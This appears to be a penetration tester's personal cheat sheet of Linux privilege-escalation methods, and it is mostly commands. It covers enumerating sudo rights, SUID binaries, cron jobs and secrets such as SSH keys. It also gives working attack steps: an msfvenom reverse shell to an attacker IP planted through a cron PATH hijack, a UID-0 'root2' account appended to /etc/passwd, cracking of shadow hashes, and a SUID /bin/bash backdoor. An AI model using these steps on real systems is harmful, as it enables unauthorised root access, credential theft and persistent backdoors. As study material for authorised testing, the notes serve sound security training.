### Methodology (https://sirensecurity.io/blog/linux-privilege-escalation-resources/)
If moving laterally first check home directories if denied this indicates we need to escalate to that user first. 
See what files are readable especially configs
try brute ssh
try su user default or simple creds
#### User and groups
Make note of any custom groups!
```
whoami
whoami -groups
```

#### Binary permissions 
[https://gtfobins.github.io/](https://gtfobins.github.io/)
```
#sudoers
sudo -l

#capabilities
/usr/sbin/getcap -r / 2>/dev/null

#suid and guid
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
#### Searching for Secrets
```
#Known files and variables
env
bashrc + bash_history

#SSH Keys
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```

#### Locally running services
These can be forwarded [here](obsidian://open?vault=Offensive-Security&file=OSCP%2FPost%20Exploitation%2FTunneling)
```
ss -ntplu
sockstat -l
netstat -an
```

#### Interesting Directories
Enumerate these thoroughly for secrets!
```
/home
/var/log
/var/www/html #Any internal websites or configs here?
/tmp
/opt

#Find all files that are readble by user.
find /etc -type f -readable 2>/dev/null

```
#### Processes (https://github.com/DominicBreuker/pspy)
Any unusual processes or commands being run?
```
#Only prints system commands.
./psspy64 -p -i 1000

#Prints system commands and events.
./pspy64 -pf -i 1000

#Looking for root processes
ps aux | grep "^root"
watch -n 1 "ps -aux | grep pass"
```
#### Cron
Are there any scripts we can write to?
Are there any scripts that have a customized PATH we can write to?
```
#Inspect these for cronjobs that we could hijack
cat /etc/crontab
ls -lah /etc/cron*
crontab -l

#Can we see running cronjobs?
grep "CRON" /var/log/syslog

#Can we write to cron path?
	#Check cronjob or binary location, is its original location first in the path or second? If its after the path we can write to continue.
	find / -name <name> /dev/null
	whereis <name>
	
	#Create shell
	msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.118.3 LPORT=21

	OR try another shell such as
	bash / python.

	#Write shell to path dir.
	#Wait for cronjob to run.
	
```


### World Writeable Directories

```
find / -writable -type d 2>/dev/null
```
#### Automation

```
./linpeas.sh
```


#### Weak File Permissions

```
#Readable /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

#Writable /etc/passwd
#Generate new SHA hash on local machine and write that in replace of the root one:
mkpasswd -m sha-512 <new-password>

#Don't forget to escape $
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

#### Kernel Exploits

```
#Compile exploits inside XenSpawn to avoid issues.
https://github.com/X0RW3LL/XenSpawn

uname -a 
cat /etc/issue
searchsploit linux kernel <version> priv esc

#Linux Exploit Suggester
linuxexploitsuggest.pl -k <version>

#Start Xenspawn
sudo systemd-nspawn -M test

#compile exploit on Xenspawn
`gcc <file.c> -o <exploit>`

#Start python server on kali.
/var/lib/machines/test/root
python -m http.server 80
```

#### Docker Breakout

```
#Confirm you are in docker container first.
find / -name .dockerenv 2>/dev/null

#Follow these guides for breakouts.
https://juggernaut-sec.com/docker-breakout-lpe/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
```


```
#Alternate way to get root rather then using a reverse shell.
chmod +s /bin/bash
/bin/bash -p
```